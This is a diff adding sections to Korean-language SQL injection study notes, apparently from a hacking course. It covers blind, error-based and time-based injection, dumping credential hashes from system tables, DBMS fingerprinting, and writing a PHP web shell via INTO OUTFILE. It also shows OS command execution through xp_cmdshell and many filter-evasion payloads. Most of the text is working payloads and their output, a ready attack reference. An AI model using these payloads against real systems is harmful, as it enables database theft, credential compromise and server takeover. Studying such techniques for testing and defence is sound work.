@@ -59,7 +59,7 @@
 
 
 
-***Application Logic***
+***Application Logic(Blind  SQL Injection)***
 	UNION을 사용한 공격
 		UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있음
 
@@ -75,6 +75,14 @@
 			==> True
 			/?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
 			==> True
+
+	참 거짓 판단 쿼리
+		대부분의 경우에 어플리케이션 화면에서 참 거짓을 판별할 수 있는 쿼리이다.
+
+			'or 1=1 limit 0,1;--
+			'or 1=2 limit 0,1;--
+
+		사실 limit문은 없어도 되지만, 간혹 select조회 결과값이 하나인지를 필터링하기도 한다.
 
 
 
@@ -97,7 +105,7 @@
 	 MySQL에서는 숫자를 비트 형태로 변환하는 bin이라는 함수를 제공
 
 		mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
-		+----------+----------+
+		+----------+----------+l
 		| username | password |
 		+----------+----------+
 		| admin    | P@ssword |
@@ -105,6 +113,7 @@
 		1 row in set (0.00 sec)
 		mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
 		Empty set (0.00 sec)
+
 
 
 ***Error based SQL Injection***
@@ -189,6 +198,1072 @@
 		ORA-06512: at line 1
 		*/
 
+
+
+***Error based Blind SQL Injection***
+	Blind SQLI와 Error based SQLI를 동시에 활용하는 공격 기법
+	에러 발생 여부만을 필요로하기 때문에 용이하게 사용할 수 있음
+
+		mysql> select if(1=1, 9e307*2,0);
+		ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
+		mysql> select if(1=0, 9e307*2,0);
+		+--------------------+
+		| if(1=0, 9e307*2,0) |
+		+--------------------+
+		|                  0 |
+		+--------------------+
+		1 row in set (0.00 sec)
+
+
+	여기서 if의 인자는 앞에서 순서대로 조건문, 참일 때, 거짓일 때 반환할 값을 나타낸다.
+
+
+
+***Short-circuit evaluation***
+	로직 연산의 원리를 이용해 공격하는 방법
+
+		mysql> SELECT 0 AND SLEEP(1);
+		+----------------+
+		| 0 AND SLEEP(1) |
+		+----------------+
+		|              0 |
+		+----------------+
+		1 row in set (0.00 sec)
+		mysql> SELECT 1 AND SLEEP(10);
+		+-----------------+
+		| 1 AND SLEEP(10) |
+		+-----------------+
+		|               0 |
+		+-----------------+
+		1 row in set (10.04 sec)
+	
+		mysql> SELECT 1=1 or 9e307*2;
+		+----------------+
+		| 1=1 or 9e307*2 |
+		+----------------+
+		|              1 |
+		+----------------+
+		1 row in set (0.00 sec)
+		mysql> SELECT 1=0 or 9e307*2;
+		ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
+
+
+
+***Time based SQL Injection***
+	시간 지연을 이용해 쿼리의 참/거짓 여부를 판단하는 공격 기법
+	간을 지연시키는 방법으로는 
+	DBMS에서 제공하는 함수 또는 시간이 많이 소요되는 연산을 수행하는 
+	헤비 쿼리 (heavy query)를 사용하는 방법이 있음
+
+		mysql> SELECT IF(1=1, sleep(1), 0);
+		/*
+		mysql> SELECT IF(1=1, sleep(1), 0);
+		+----------------------+
+		| IF(1=1, sleep(1), 0) |
+		+----------------------+
+		|                    0 |
+		+----------------------+
+		1 row in set (1.00 sec)
+		*/
+		mysql> SELECT IF(1=0, sleep(1), 0);
+		/*
+		mysql> SELECT IF(1=0, sleep(1), 0);
+		+----------------------+
+		| IF(1=0, sleep(1), 0) |
+		+----------------------+
+		|                    0 |
+		+----------------------+
+		1 row in set (0.00 sec)
+		*/
+
+	다음은 DBMS별로 시간끄는 방법을 나열한 것
+
+		MySQL
+		Figure 13. sleep 함수 사용 예시
+
+		/* SLEEP(duration) */
+		mysql> SELECT SLEEP(1);
+		+----------+
+		| SLEEP(1) |
+		+----------+
+		|        0 |
+		+----------+
+		1 row in set (1.00 sec)
+
+
+		Figure 14. benchmark 함수 사용 예시
+
+		/*benchmark()는 expr을 count만큼 반복하는 함수다.
+		아래는 1이라는 데이터에 SHA1해쉬함수를 400000000번 한 연산인 것이다.*/
+		/* BENCHMARK(count, expr) */
+		mysql> SELECT BENCHMARK(40000000,SHA1(1));
+		+-----------------------------+
+		| BENCHMARK(40000000,SHA1(1)) |
+		+-----------------------------+
+		|                           0 |
+		+-----------------------------+
+		1 row in set (10.78 sec)
+
+
+		Figure 15. 헤비 쿼리 사용 예시
+
+		/*from절에 여러테이블을 콤마로 나열하면, 기본적으로 크로스 조인이 된다*/
+		mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+		+----------+
+		| heavy    |
+		+----------+
+		| 24897088 |
+		+----------+
+		1 row in set (1.41 sec)
+		mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
+		+-------+
+		| heavy |
+		+-------+
+		| 85264 |
+		+-------+
+		1 row in set (0.01 sec)
+		mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+		+----------+
+		| heavy    |
+		+----------+
+		| 24897088 |
+		+----------+
+		1 row in set (1.38 sec)
+
+		MSSQL
+		Figure 16. WAITFOR 사용 예시
+
+		/* waitfor delay 'time_to_pass'; */
+		> SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
+		Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec
+
+
+		Figure 17. 헤비 쿼리 사용 예시
+
+		select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
+		/*
+		Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
+		*/
+
+		SQLite
+		Figure 18. 헤비 쿼리 사용 예시
+
+		/* LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) */
+		sqlite> .timer ON
+		sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
+		0
+		Run Time: real 9.740 user 7.983349 sys 1.743972
+
+		
+
+***System Tables***
+	DBMS마다 데이터베이스의 정보를 포괄하는 시스템 테이블이 존재
+	시스템 테이블에는 설정 및 계정 정보 외에도 테이블과 컬럼 정보, 
+	현재 실행되고 있는 쿼리의 정보 등 다양한 정보를 포함하고 있음
+
+	MYSQL
+		mysql 초기설치시, information_schema와 mysql, performance_schema, sys 데이터베이스가 있음
+
+			mysql> show databases;
+			/*
+			+--------------------+
+			| Database           |
+			+--------------------+
+			| information_schema |
+			| DREAMHACK          | # 이용자 정의 데이터베이스
+			| mysql              |
+			| performance_schema |
+			| sys                |
+			+--------------------+
+			*/
+
+		전체 스키마 정보 조회
+
+			mysql> select TABLE_SCHEMA from information_schema.tables group by TABLE_SCHEMA;
+			/*
+			+--------------------+
+			| TABLE_SCHEMA       |
+			+--------------------+
+			| information_schema |
+			| DREAMHACK          |
+			| mysql              |
+			| performance_schema |
+			| sys                |
+			+--------------------+
+			5 rows in set (0.01 sec)
+			*/
+
+		테이블 정보 조회
+
+			mysql> select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
+			/*
+			+--------------------+----------------+
+			| TABLE_SCHEMA       | TABLE_NAME     |
+			+--------------------+----------------+
+			| information_schema | CHARACTER_SETS |
+			...
+			| DREAMHACK          | users          |
+			| mysql              | db             |
+			...
+			+--------------------+----------------+
+			292 rows in set (0.01 sec)
+			*/
+
+		컬럼 정보 조회
+
+			mysql> select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS;
+			/*
+			+--------------------+----------------+--------------------+
+			| TABLE_SCHEMA       | TABLE_NAME     | COLUMN_NAME        |
+			+--------------------+----------------+--------------------+
+			| information_schema | CHARACTER_SETS | CHARACTER_SET_NAME |
+			...
+			| DREAMHACK          | users          | uid                |
+			| DREAMHACK          | users          | upw                |
+			...
+			| mysql              | db             | Db                 |
+			| mysql              | db             | User               |
+			...
+			+--------------------+----------------+--------------------+
+			3132 rows in set (0.07 sec)
+			*/
+
+		실시간 실행쿼리 조회
+
+			mysql> select * from information_schema.PROCESSLIST;
+			/*
+			+-------------------------------------------------+
+			| info                                            |
+			+-------------------------------------------------+
+			| select info from information_schema.PROCESSLIST |
+			+-------------------------------------------------+
+			1 row in set (0.00 sec)
+			*/
+
+			mysql> select user,current_statement from sys.session;
+			/*
+			+----------------+------------------------------------------------+
+			| user           | current_statement                              |
+			+----------------+------------------------------------------------+
+			| root@localhost | select user,current_statement from sys.session |
+			+----------------+------------------------------------------------+
+			1 row in set (0.05 sec)
+			*/
+
+		DBMS 계정정보
+
+			mysql> select GRANTEE,PRIVILEGE_TYPE,IS_GRANTABLE from information_schema.USER_PRIVILEGES;
+			/*
+			+-------------------------+-------------------------+--------------+
+			| GRANTEE                 | PRIVILEGE_TYPE          | IS_GRANTABLE |
+			+-------------------------+-------------------------+--------------+
+			| 'root'@'localhost'      | SELECT                  | YES          |
+			...
+			| 'root'@'localhost'      | SUPER                   | YES          |
+			...
+			| 'user_test'@'localhost' | USAGE                   | NO           |
+			+-------------------------+-------------------------+--------------+
+			58 rows in set (0.00 sec)
+			*/
+
+			mysql> select User, authentication_string from mysql.user;
+			/*
+			+------------------+-------------------------------------------+
+			| User             | authentication_string                     |
+			+------------------+-------------------------------------------+
+			| root             | *...                                      |
+			| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+			| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+			| user_test        | *...                                      |
+			+------------------+-------------------------------------------+
+			4 rows in set (0.00 sec)
+			*/
+
+
+	MSSQL
+		초기 설치 시 master와 tempdb, model, 그리고 msdb 데이터베이스가 있음
+
+			SELECT name FROM sys.databases
+			/*
+			name
+			-------
+			master
+			tempdb
+			model
+			msdb
+			dreamhack # 이용자 정의 데이터베이스 (예시)
+			*/
+
+		데이터베이스 정보 조회
+		DB_NAME(0) 은 현재 사용중인 DB
+
+			SELECT name FROM master..sysdatabases;
+			/*
+			name
+			-------
+			master
+			tempdb
+			model
+			msdb
+			dreamhack # 이용자 정의 데이터베이스 (예시)
+			*/
+
+			SELECT DB_NAME(1);
+			/*
+			master
+			*/
+
+		테이블 정보 조회
+		xtype='U'는 이용자 정의 테이블을 의미
+
+			SELECT name FROM dreamhack..sysobjects WHERE xtype = 'U';
+			# xtype='U' 는 이용자 정의 테이블을 의미합니다.
+			/*
+			name
+			-------
+			users
+			*/
+
+			SELECT table_name FROM dreamhack.information_schema.tables;
+			/*
+			table_name
+			-----------
+			users
+			*/
+
+		컬럼 정보 조회
+
+			SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
+			/*
+			name
+			-----
+			uid
+			upw
+			*/
+
+			SELECT table_name, column_name FROM dreamhack.information_schema.columns;
+			/*
+			table_name	column_name
+			-------------------------
+			users		uid
+			users		upw
+			*/
+
+		DBMS 계정 정보 조회
+
+			SELECT name, password_hash FROM master.sys.sql_logins;
+			/*
+			name		password_hash
+			--------------------------
+			sa			NULL
+			dreamhack	NULL
+			*/
+
+			SELECT * FROM master..syslogins;
+
+
+	PostgreSQL
+		설치 시 초기에 postgres와 template1, template0 데이터베이스가 있음
+
+			postgres=$ select datname from pg_database;
+			/*
+			  datname  
+			-----------
+			 postgres
+			 template1
+			 template0
+			(3 rows)
+			*/
+
+		스키마(카탈로그) 정보 조회
+		주요 정보를 담고 있는 테이블을 포함한 스키마는 pg_catalog, information_schema가 있음
+
+			postgres=$ select nspname from pg_catalog.pg_namespace;
+			/*
+			      nspname       
+			--------------------
+			 pg_toast
+			 pg_temp_1
+			 pg_toast_temp_1
+			 pg_catalog
+			 public
+			 information_schema
+			(6 rows)
+			*/
+
+		주요 테이블 스키마 정보 조회
+
+			postgres=$ select table_name from information_schema.tables where table_schema='pg_catalog';
+			/*
+			           table_name
+			---------------------------------
+			pg_shadow
+			pg_settings
+			pg_database
+			pg_stat_activity
+			...
+			*/
+			postgres=# select table_name from information_schema.tables where table_schema='information_schema';
+			/*
+			              table_name
+			---------------------------------------
+			schemata
+			tables
+			columns
+			...
+			*/
+
+		DBMS 계정 정보 조회
+
+			postgres=$ select usename, passwd from pg_catalog.pg_shadow;
+			/*
+			 usename  |               passwd
+			----------+-------------------------------------
+			 postgres | md5df6802cb10f4000bf81de27261c1155f
+			(1 row)
+			*/
+
+		DBMS 설정 정보 조회
+
+			postgres=$ select name, setting from pg_catalog.pg_settings;
+			/*
+			                  name                  |                 setting
+			----------------------------------------+------------------------------------------
+			 allow_system_table_mods                | off
+			 application_name                       | psql
+			 ...
+			*/
+
+		실시간 실행 쿼리 확인
+
+			postgres=$ select usename, query from pg_catalog.pg_stat_activity;
+			/*
+			 usename  |                          query                          
+			----------+---------------------------------------------------------
+			 postgres | select usename, query from pg_catalog.pg_stat_activity;
+			(1 row)
+			*/
+
+		테이블 정보 조회
+
+			postgres=$ select table_schema, table_name from information_schema.tables;
+			/*
+			    table_schema    |              table_name
+			--------------------+---------------------------------------
+			 pg_catalog         | pg_statistic
+			...
+			 information_schem  | information_schema_catalog_name
+			...
+			*/
+
+		컬럼 정보 조회
+
+			postgres=$ select table_schema, table_name, column_name from information_schema.columns;
+			/*
+			    table_schema    |      table_name         |    column_name
+			--------------------+-------------------------+------------------
+			 pg_catalog         | pg_stat_user_indexes    | relid
+			...
+			 information_schema | view_routine_usage      | specific_name
+			...
+			*/
+
+	Oracle
+
+		데이터베이스 정보
+		all_tables는 현재 사용자가 접근할 수 있는 테이블의 집합
+
+			SELECT DISTINCT owner FROM all_tables
+			SELECT owner, table_name FROM all_tables
+
+		컬럼 정보 조회
+
+			SELECT column_name FROM all_tab_columns WHERE table_name = 'users'
+
+		DBMS 계정 정보 조회
+
+			SELECT * FROM all_users
+
+	SQLite
+
+		시스템 테이블
+
+			sqlite> .header on
+			-- 콘솔에서 실행 시 컬럼 헤더를 출력하기 위해 설정합니다.
+			sqlite> select * from sqlite_master;
+			/*
+			type|name|tbl_name|rootpage|sql
+			table|users|users|2|CREATE TABLE users (uid text, upw text)
+			*/
+
+
+***DBMS Fingerprinting***
+	DBMS 종류와 버전 알아내기
+	아래는 위 정보를 알아내기 위한 범용적인 방법이다.
+	각각의 DBMS별로 구체적인 쿼리는 아래에 분류해놨음 
+
+		/* 환경변수, 함수를 이용해 버전정보 알아내기 */
+		SELECT @@version
+		SELECT version()
+
+		/* 에러 메시지로 DBMS 확인하기 */
+		select 1 union select 1, 2;
+		# MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
+		(select * from not_exists_table)
+		# SQLite => Error: no such table: not_exists_table
+
+		/* Blind SQL Injection을 이용해 버전 정보를 한 바이트씩 비교하여 알아내기 */
+		mid(@@version, 1, 1)='5';
+		substr(version(), 1, 1)='P';
+
+		/* 출력이 존재하지 않는다면 시간 지연 함수로 알아내기 */
+		sleep(10)
+		pg_sleep(10)
+
+
+	MYSQL
+
+		mysql> select @@version; # select version();
+		+-------------------------+
+		| @@version               |
+		+-------------------------+
+		| 5.7.29-0ubuntu0.16.04.1 |
+		+-------------------------+
+		1 row in set (0.00 sec)
+
+		mysql> select 1 union select 1, 2;
+		ERROR 1222 (21000): The used SELECT statements have a different number of columns
+
+		# @@version => '5.7.29-0ubuntu0.16.04.', mid(@@version, 1, 1) => '5'
+		mysql> select mid(@@version, 1, 1)='5';
+		+------------------------+
+		| mid(@@version,1,1)='5' |
+		+------------------------+
+		|                      1 |
+		+------------------------+
+		1 row in set (0.00 sec)
+		mysql> select mid(@@version, 1, 1)='6';
+		+------------------------+
+		| mid(@@version,1,1)='6' |
+		+------------------------+
+		|                      0 |
+		+------------------------+
+		1 row in set (0.00 sec)
+
+		mysql> select mid(@@version, 1, 1)='6' and sleep(2);
+		+---------------------------------------+
+		| mid(@@version, 1, 1)='6' and sleep(2) |
+		+---------------------------------------+
+		|                                     0 |
+		+---------------------------------------+
+		1 row in set (0.00 sec)
+		mysql> select mid(@@version, 1, 1)='5' and sleep(2);
+		+---------------------------------------+
+		| mid(@@version, 1, 1)='5' and sleep(2) |
+		+---------------------------------------+
+		|                                     0 |
+		+---------------------------------------+
+		1 row in set (2.00 sec)
+
+
+	PostgreSQL
+
+		postgres=$ select version();
+		version
+		--------
+		 PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
+		(1 row)
+
+		postgres=$ select 1 union select 1, 2;
+		ERROR:  each UNION query must have the same number of columns
+		LINE 1: select 1 union select 1, 2;
+
+		/* version() => 'PostgreSQL ...', substr(version(), 1, 1) => 'P' */
+		postgres=$ select substr(version(), 1, 1)='P';
+		 ?column?
+		----------
+		 t
+		(1 row)
+		postgres=# select substr(version(), 1, 1)='Q';
+		 ?column?
+		----------
+		 f
+		(1 row)
+
+		postgres=$ select substr(version(), 1, 1)='P' and pg_sleep(10);
+		 pg_sleep
+		----------
+		(1 row)
+
+
+	MSSQL
+
+		> select @@version;
+		------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+		Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64)
+			Nov 30 2018 12:57:58
+			Copyright (C) 2017 Microsoft Corporation
+			Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS)
+		(1 rows affected)
+
+		> select 1 union select 1, 2;
+		Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1
+		All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
+
+		-- @@version => 'Microsoft SQL Server...', substring(@@version, 1, 1) => 'M'
+		> select 1 from test where substring(@@version, 1, 1)='M';
+		-----------
+		          1
+		(1 rows affected)
+		1> select 1 from test where substring(@@version, 1, 1)='N';
+		2> go
+		-----------
+		(0 rows affected)
+
+		select 1 where substring(@@version, 1, 1)='M' and waitfor delay '0:0:5';
+
+
+	SQLite
+
+		sqlite> select sqlite_version();
+		3.11.0
+
+		sqlite> select 1 union select 1, 2;
+		Error: SELECTs to the left and right of UNION do not have the same number of result columns
+
+		-- sqlite_version() => '3.11.0', substr(sqlite_version(), 1, 1) => '3'
+		sqlite> select substr(sqlite_version(), 1, 1)='3';
+		1
+		sqlite> select substr(sqlite_version(), 1, 1)='4';
+		0
+
+		select case when substr(sqlite_version(), 1, 1)='3' then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end;
+
+
+
+***DBMS Misconfiguration***
+	Out of DBMS: MySQL
+		MySQL에서 파일 관련된 작업을 할 때에는 mysql 권한으로 수행
+		“my.cnf” 설정 파일의 secure_file_priv 값에 영향을 받음
+		secure_file_priv는 mysql 쿼리 내에서 load_file 혹은 outfile을 이용해 파일에 접근할 수 있음
+		기본적으로 secure_file_priv의 값은 /var/lib/mysql-files/임
+
+			# my.cnf
+			[mysqld]
+			# secure_file_priv = ""   # 미설정. 기본 설정 값으로 설정됩니다.
+			secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능합니다.
+			secure_file_priv = ""     # mysql의 권한이 가능한 모든 경로에 접근이 가능합니다.
+			secure_file_priv = NULL   # 기능이 비활성화 됩니다.
+
+		secure_file_priv 값 조회
+
+			mysql> select @@secure_file_priv;
+			+-----------------------+
+			| @@secure_file_priv    |
+			+-----------------------+
+			| /var/lib/mysql-files/ |
+			+-----------------------+
+
+		load_file 함수는 인자로 전달된 파일을 읽고, 출력함
+		이때, 전달되는 파일은 전체 경로를 입력해야 하며 해당 파일에 접근 권한이 있어야 함
+
+			# echo test1234 > /var/lib/mysql-files/test
+			mysql> select load_file('/var/lib/mysql-files/test');
+			+----------------------------------------+
+			| load_file('/var/lib/mysql-files/test') |
+			+----------------------------------------+
+			| test1234                               |
+			+----------------------------------------+
+
+		SELECT ... INTO 형식의 쿼리는 쿼리 결과를 변수나 파일에 쓸 수 있음
+
+			SELECT ... INTO var_list             # column 값을 변수에 저장
+			SELECT ... INTO OUTFILE  'filename'  # 쿼리 결과의 rows 값을 파일에 저장
+			SELECT ... INTO DUMPFILE 'filename'  # 쿼리 결과(single row)를 파일에 저장
+
+		만약 secure_file_priv의 값이 올바르지 않아 임의 경로에서 파일 작업을 수행할 수 있다면
+		이를 통해 웹셸을 업로드하는 등의 공격이 가능
+
+			mysql> select '<?=`ls`?>' into outfile '/tmp/a.php';
+			/* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a" */
+			/*<?php include $_GET['page'].'.php  이 부분이 이미 웹서버에 있다고 가정할때, 
+			mysql outfile 이용해서 악성 php 코드를 웹서버가 실행할 수 있는 곳에 저장해두고 나서  
+			page매개변수로 ../../../tmp/a 이 값을 넣어주면 악성코드를 실행할 수 있음*/
+
+
+	Out of DBMS: MSSQL
+		MSSQL에서는 xp_cmdshell 기능을 이용해 OS 명령어를 실행할 수 있음
+		해당 기능의 활성화 여부를 판단하는 쿼리는 다음과 같음
+		해당 쿼리의 실행 결과에서 1이 반환되면 활성화, 0이라면 비활성화 상태를 의미
+
+			SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
+
+		만약 xp_cmdshell 기능이 활성화되어 있는 경우,
+		아래와 같은 방식으로 OS 명령어를 실행할 수 있음
+
+			EXEC xp_cmdshell "net user";
+			EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+
+
+	DBMS 문자열 비교 주의 사항
+		각각의 DBMS는 문자열을 비교하는 방법이 서로 다름
+		같은 이유로 웹 애플리케이션과 DBMS에서 문자열을 비교하는 방식이 다를 수 있음
+
+			<?php
+			...
+			// $input = "Admin"; # 대소문자 구분
+			// $input = "admin "; # 공백 문자로 끝나는 문자열 비교
+			if($input === "admin") die("can't account lookup"); // filter bypass
+			/*
+			DBMS
+			uid: admin, account_info: secret
+			...
+			*/
+			echo query("select account_info from users where uid='{$input}';");
+
+		MySQL과 MSSQL에서는 비교 연산에서 대소문자를 구분하지 않음
+
+			mysql> select 'a'='A';
+			/*
+			+---------+
+			| 'a'='A' |
+			+---------+
+			|       1 |
+			+---------+
+			*/
+
+			> select 1 from test where 'a'='A';
+			/*
+			-----------
+			          1
+			*/
+
+		일부 DBMS에서는 비교 연산 시 할당된 컬럼의 크기에 맞게 공백 문자를 채운 후에 비교
+		예를 들어, CHAR(5)로 생성된 컬럼에 “ab”라는 데이터가 입력되면 이는 “ab   ”가 
+
+			mysql> select 'a'='a ';
+			/*
+			+---------+
+			| 'a'='a '|
+			+---------+
+			|       1 |
+			+---------+
+			*/
+
+			> select 1 from test where 'a'='a ';
+			/*
+			-----------
+			          1
+			*/
+
+
+	DBMS 다중 쿼리 주의 사항
+		다중 쿼리 (Multi Query)는 다음 예시와 같이 하나의 요청에 다수의 쿼리 구문을 사용하는 것을 의미
+		만약, 애플리케이션에서 다중 쿼리를 지원한다면 
+		공격자는 본래 실행되는 쿼리문에 새로운 쿼리를 작성해 
+		데이터베이스를 삭제하거나 값을 추가하는 등의 행위가 가능
+		이런 위험성 때문에 대부분의 웹 애플리케이션은 DBMS에 쿼리를 전송할 때 다중 쿼리를 지원하지 않음
+
+		PDO의 query 함수는 다중 쿼리를 지원하지 않고, 
+		exec 함수에서는 다중 쿼리를 실행한다는 차이점이 있음
+
+			<?php
+			    $db1 = new PDO('sqlite:test1.db');
+			    $db2 = new PDO('sqlite:test2.db');
+			    $query = 'select 1234;create table test(test int);';
+			    $db1->query($query);
+			    $db2->exec($query);
+			?>
+
+			$ php test.php
+			$ ls -al test1.db test2.db
+			-rw-r--r-- 1 test test    0 Apr 29 11:21 test1.db # create table이 실행되지 않음
+			-rw-r--r-- 1 test test 2048 Apr 29 11:20 test2.db # create table이 실행됨
+
+
+
+***탐지 우회***
+	대소문자 검사 미흡
+
+		UnIoN SeLecT 1,2,3
+		selECT SlEep(5)
+
+
+	탐지 과정 미흡
+
+		UNunionION SELselectECT 1,2 --
+		# => UNION SELECT 1,2 --  
+
+
+	문자열 검사 미흡
+
+		mysql> SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
+		/*
+		+------------------+--------------------+---------------+--------------+
+		| reverse('nimda') | concat('adm','in') | x'61646d696e' | 0x61646d696e |
+		+------------------+--------------------+---------------+--------------+
+		| admin            | admin              | admin         | admin        |
+		+------------------+--------------------+---------------+--------------+
+		1 row in set (0.00 sec)
+		*/
+
+
+	연산자 검사 미흡
+	^, =, !=, %, _, /, *, &, &&, |, ||, >, <, XOR, DIV, LIKE, 
+	RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL ...
+
+		 mysql> select 1 || 1;
+		 /*
+		 +--------+
+		| 1 || 1 |
+		+--------+
+		|      1 |
+		+--------+
+		1 row in set (0.00 sec)
+		*/
+
+	특히 %, _는 와일카드라고 불림
+	substring, substr, mid, pad, left, right 이런 함수들이 필터링되어 있을 때,
+	다음과 같이 우회할 수 있음
+
+		uid=admin" and upw like "p%"-- 
+
+
+	공백 탐지 미흡
+
+		mysql> SELECT/**/'abc';
+		/*
+		+-----+
+		| abc |
+		+-----+
+		| abc |
+		+-----+
+		1 row in set (0.00 sec)
+		*/
+
+		mysql> select`username`,(password)from`users`WHERE`username`='admin';
+		/*
+		+----------+----------------+
+		| username | password       |
+		+----------+----------------+
+		| admin    | admin_password |
+		+----------+----------------+
+		1 row in set (0.00 sec)
+		*/
+
+
+	MYSQL 우회 기법
+		MySQL 진법을 이용한 문자열 검사 우회
+
+			mysql> select 0x6162, 0b110000101100010;
+			/*
+			+--------+-------------------+
+			| 0x6162 | 0b110000101100010 |
+			+--------+-------------------+
+			| ab     | ab                |
+			+--------+-------------------+
+			1 row in set (0.00 sec)
+			*/
+
+		MySQL 함수를 이용한 문자열 검사 우회
+
+			mysql> select char(0x61, 0x62);
+			/*
+			+------------------+
+			| char(0x61, 0x62) |
+			+------------------+
+			| ab               |
+			+------------------+
+			1 row in set (0.00 sec)
+			*/
+			mysql> select concat(char(0x61), char(0x62));
+			/*
+			+--------------------------------+
+			| concat(char(0x61), char(0x62)) |
+			+--------------------------------+
+			| ab                             |
+			+--------------------------------+
+			*/
+
+		MySQL 가젯을 이용한 문자열 검사 우회
+
+			mysql> select mid(@@version,12,1);
+			/*
+			+---------------------+
+			| mid(@@version,12,1) |
+			+---------------------+
+			| n                   |
+			+---------------------+
+			*/
+
+		MySQL 개행을 이용한 공백 검사 우회
+
+			mysql> select
+			    -> 1;
+			/*
+			+---+
+			| 1 |
+			+---+
+			| 1 |
+			+---+
+			*/
+
+		MySQL 주석을 이용한 공백 검사 우회
+
+			mysql> select/**/1;
+			/*
+			+---+
+			| 1 |
+			+---+
+			| 1 |
+			+---+
+			*/
+
+		주석구문 실행(/*! */)
+
+			mysql> select 1 /*!union*/ select 2;
+			/*
+			+---+
+			| 1 |
+			+---+
+			| 1 |
+			| 2 |
+			+---+
+			2 rows in set (0.00 sec)
+			*/
+
+
+	PostgreSQL 우회 기법
+		PostgreSQL 함수를 이용한 문자열 검사 우회
+
+			postgres=> select chr(65);
+			/*
+			 chr
+			-----
+			 A
+			*/
+
+		PostgreSQL 함수를 이용한 문자열 검사 우회 - 2
+
+			postgres=> select concat(chr(65), chr(66));
+			/*
+			 concat
+			--------
+			 AB
+			*/
+
+		PostgreSQL 가젯을 이용한 문자열 검사 우회
+
+			postgres=> select substring(version(),23,1);
+			/*
+			 substring
+			-----------
+			 n
+			*/
+
+		PostgreSQL 개행을 이용한 공백 검사 우회
+
+			postgres=> select
+			1;
+			/*
+			 ?column?
+			----------
+			        1
+			*/
+
+		PostgreSQL 주석을 이용한 공백 검사 우회
+
+			postgres=> select/**/1;
+			/*
+			 ?column?
+			----------
+			        1
+			*/
+
+
+	MSSQL 우회 기법
+		MSSQL 함수를 이용한 문자열 검사 우회
+
+			> select char(0x61);
+			/*
+			-
+			a
+			*/
+
+
+		MSSQL 함수를 이용한 문자열 검사 우회 - 2
+
+			> select concat(char(0x61), char(0x62));
+			/*
+			--
+			ab
+			*/
+
+
+		MSSQL 가젯을 이용한 문자열 검사 우회
+
+			> select substring(@@version,134,1);
+			/*
+			-
+			n
+			*/
+
+		MSSQL 개행을 이용한 공백 검사 우회
+
+			> select
+			1;
+			/*
+			-----------
+			          1
+			*/
+
+
+		MSSQL 주석을 이용한 공백 검사 우회
+
+			> select/**/1;
+			/*
+			-----------
+			          1
+			*/
+
+
+	SQLite 우회 기법
+		SQLite 함수를 이용한 문자열 검사 우회
+
+			sqlite> select char(0x61);
+			/*
+			a
+			*/
+
+		SQLite 함수를 이용한 문자열 검사 우회 - 2
+
+			sqlite> select char(0x61)||char(0x62);
+			/*
+			ab
+			*/
+
+		SQLite 개행을 이용한 공백 검사 우회
+
+			sqlite> select
+			   ...> 1;
+			/*
+			1
+			*/
+
+		SQLite 주석을 이용한 공백 검사 우회
+
+			sqlite> select/**/1;
+			/*
+			1
+			*/
+
+		SQLite 구문 검사 우회
+
+			sqlite> select 1 union values(2);
+			/*
+			1
+			2
+			*/
 
 
 ***성공 쿼리 모음***
